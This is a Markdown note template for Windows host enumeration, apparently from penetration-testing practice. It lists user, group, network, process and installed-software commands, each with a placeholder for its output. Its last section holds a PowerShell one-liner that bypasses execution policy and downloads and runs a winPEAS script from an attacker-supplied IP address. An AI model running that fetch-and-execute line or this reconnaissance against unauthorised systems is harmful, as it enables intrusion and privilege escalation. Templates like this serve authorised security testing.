# System Information
## Username and Hostname
```powershell
whoami
```
```
<insert hostname\username here>
```

## Group memberships of the current user
```powershell
whoami /groups
```
```
<insert output here>
```

## Existing users and groups
### Enumerating Users
```batch
net user
```
```
<insert output here>
```
```powershell
Get-LocalUser
```
```
<insert output here>
```
### Enumerating Groups
```batch
net localgroup
```
```
<insert output here>
```
```powershell
Get-LocalGroup
```
```
<insert output here>
```
```powershell
Get-LocalGroupMember $GROUP
```
```
<insert output here>
```

## Operating system, version and architecture
### System Information
```batch
systeminfo
```
```
<insert output here>
```
### Network Information
```batch
ipconfig /all
```
```
<insert output here>
```
```batch
route print
```
```
<insert output here>
```
```batch
netstat -ano
```
```
<insert output here>
```
### Installed Applications and Running Services
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```
<insert output here>
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```
<insert output here>
```
```batch
dir "C:\Program Files"
```
```
<insert output here>
```
```batch
dir "C:\Program Files (x86)"
```
```
<insert output here>
```
```batch
dir %USERPROFILE%\Downloads
```
```
<insert output here>
```
```powershell
Get-Process
```
```
<insert output here>
```

# Winpeas
```powershell
powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
```
```
<insert winpeas output here>
```
